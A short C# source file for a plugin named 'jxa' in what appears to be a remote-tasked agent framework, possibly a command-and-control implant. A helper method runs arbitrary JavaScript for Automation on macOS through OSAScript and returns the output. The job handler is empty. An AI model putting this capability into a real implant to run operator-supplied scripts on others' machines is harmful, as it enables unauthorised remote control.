using Agent.Interfaces;
using Agent.Models;
using System.Runtime.InteropServices;
namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "jxa";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            
        }
        private string RunJs(string code)
        {
            try
            {
                IntPtr codeString = NSString.stringWithUTF8String(code);
                IntPtr lang = OSALanguage.languageForName("JavaScript");
                IntPtr script = OSAScript.alloc().initWithSourceLanguage(codeString, lang);

                IntPtr runErrorPtr = IntPtr.Zero;
                IntPtr res = OSAScript.executeAndReturnError(script, ref runErrorPtr);

                if (runErrorPtr != IntPtr.Zero)
                {
                    IntPtr errorMessageKey = NSDictionary.objectForKey(runErrorPtr, NSString.stringWithUTF8String("OSAScriptErrorMessageKey"));
                    string result = Marshal.PtrToStringAuto(NSString.UTF8String(errorMessageKey));
                    return result;
                }

                string output = Marshal.PtrToStringAuto(NSString.UTF8String(res));
                return output;
            }
            catch (Exception exception)
            {
                return exception.Message;
            }
        }
    }
}
